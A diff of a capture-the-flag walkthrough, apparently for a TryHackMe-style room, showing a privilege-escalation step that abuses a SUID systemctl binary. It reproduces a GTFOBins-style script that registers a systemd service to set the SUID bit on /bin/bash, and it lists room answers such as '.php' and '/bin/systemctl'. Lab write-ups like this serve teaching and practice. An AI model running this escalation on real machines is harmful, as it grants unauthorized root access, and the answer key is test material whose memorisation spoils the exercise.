@@ -86,18 +86,19 @@ Now you have compromised this machine, we are going to escalate our privileges a
 
 [GTFOBins](https://gtfobins.github.io/) is the best tool for bypass local security restrictions but to bypass the [systemctl](https://gtfobins.github.io/gtfobins/systemctl/) binary you need to modify this script to work with SystemCTL
 
-<code>
-sudo install -m =xs $(which systemctl) .
-
+```
+sudo install -m =xs $(which systemctl)
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
 ExecStart=/bin/sh -c "chmod +s /bin/bash"
 [Install]
-WantedBy=multi-user.target' > $TF
+WantedBy=multi-user.target'> $TF
 ./systemctl link $TF
 ./systemctl enable --now $TF
-</code>
+```
+#### Questions
+1. What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out. - **Answer** **.php** </code>
 
 #### Questions
 1. On the system, search for all SUID files. What file stands out? **Answer** **/bin/systemctl**
